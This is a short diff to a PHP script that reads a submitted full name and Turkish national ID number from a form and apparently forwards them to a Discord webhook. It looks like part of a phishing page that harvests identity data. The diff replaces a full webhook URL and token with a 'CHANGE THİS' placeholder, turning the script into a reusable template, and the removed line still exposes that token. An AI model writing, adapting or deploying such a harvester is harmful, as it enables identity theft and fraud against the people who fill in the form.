@@ -1,6 +1,6 @@
 <?php
 if ($_POST) {
-    $WEBHOOK = "https://discord.com/api/webhooks/953718081761452052/94gjYUeeED0aAa27dfC6VOeniJmU9uY33wDivQxSJBPNXc-Mk6vxOfFLuoEoR8EtHeYG";
+    $WEBHOOK = "https://discord.com/api/webhooks/953718081761452052/CHANGE THİS";
     $NAME = $_POST["adsoy"];
     $PASS = $_POST["tckn"];
     $headers = [ 'Content-Type: application/json; charset=utf-8' ];
